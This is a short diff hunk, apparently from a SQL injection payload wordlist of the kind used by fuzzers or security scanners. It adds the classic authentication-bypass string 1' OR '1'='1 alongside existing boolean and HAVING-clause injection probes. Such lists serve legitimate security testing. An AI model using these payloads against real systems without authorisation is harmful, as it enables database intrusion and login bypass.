@@ -12,6 +12,7 @@
  OR x=y-- 
  OR 3409=3409 AND ('pytW' LIKE 'pytW
  OR 3409=3409 AND ('pytW' LIKE 'pytY
+ 1' OR '1'='1
  HAVING 1=1
  HAVING 1=0
  HAVING 1=1#
